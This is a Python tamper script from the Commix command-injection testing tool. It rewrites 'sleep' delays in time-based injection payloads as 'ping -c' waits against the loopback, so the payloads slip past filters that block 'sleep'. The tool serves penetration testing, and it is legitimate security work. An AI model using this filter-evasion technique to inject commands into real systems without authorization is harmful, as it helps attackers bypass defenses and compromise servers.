#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import re
from src.utils import settings
from src.core.controller import checks

"""
About: Replaces 'sleep' with the wait between 'ping' packets in a given payload.
Notes: This tamper script works against target(s) with a POSIX shell.
Reference: https://man7.org/linux/man-pages/man8/ping.8.html
"""

__tamper__ = "sleep2ping"
__priority__ = settings.PRIORITY.NORMAL

# Why this script cannot be applied to the target at hand, or nothing where it can.
def dependencies():
  return checks.tamper_dep_time_related_only(__tamper__) or checks.tamper_dep_unix_only(__tamper__)

# The loopback, so that the wait needs no network of the target's own and asks no name of anyone.
PING_HOST = "127.0.0.1"

if not settings.TAMPER_SCRIPTS[__tamper__]:
  settings.TAMPER_SCRIPTS[__tamper__] = True

def _arithmetic_end(text):
  """The offset just past the '))' closing an arithmetic expansion, counted rather than searched for."""
  depth, index = 0, 1
  while index < len(text):
    if text[index] == "(":
      depth += 1
    elif text[index] == ")":
      depth -= 1
      if depth == 0:
        return index + 1
    index += 1
  return -1

def _ping_wait(count, whitespace):
  """
  The wait itself, spelled as packets rather than seconds.

  'ping' sends the first packet at once and waits a second before each one after it, so the count
  that waits as long as 'sleep' does is one higher than its seconds. Its output goes nowhere, the
  way the command it stands in for has none to give.
  """
  return ("ping" + whitespace + "-c" + whitespace + count + whitespace +
          PING_HOST + settings.FILE_WRITE_OPERATOR.strip() + "/dev/null")

def _sleep_to_ping(payload):
  """Every 'sleep' in the payload restated as the wait between ping packets."""
  whitespace = checks.current_whitespace()
  # Matched however the gap is spelled where this reads it, and written with the run's own.
  token = re.compile("sleep" + checks.tamper_blank_pattern())
  out, index = [], 0
  while True:
    found = token.search(payload, index)
    if not found:
      out.append(payload[index:])
      return "".join(out)
    at = found.start()
    out.append(payload[index:at])
    rest = payload[found.end():]
    consumed = 0
    if rest.startswith("$(("):
      end = _arithmetic_end(rest)
      # A count is never allowed to reach zero, which asks 'ping' for no packets at all rather
      # than for no wait - so the one it is short of a second is added inside the expansion.
      if end != -1:
        count, consumed = "$((1+" + rest[3:end - 2] + "))", end
    else:
      seconds = re.match(r"\d+", rest)
      if seconds:
        count, consumed = str(int(seconds.group(0)) + 1), seconds.end()
    if not consumed:
      # Put back exactly what was matched, the gap included - it is this payload's, not this run's.
      out.append(found.group(0))
      index = found.end()
      continue
    out.append(_ping_wait(count, whitespace))
    index = found.end() + consumed

# Wait out the packets where the payload waited out the seconds.
def tamper(payload):
  if settings.TARGET_OS != settings.OS.WINDOWS and settings.TIME_RELATED_ATTACK:
    return _sleep_to_ping(payload)
  return payload

# eof
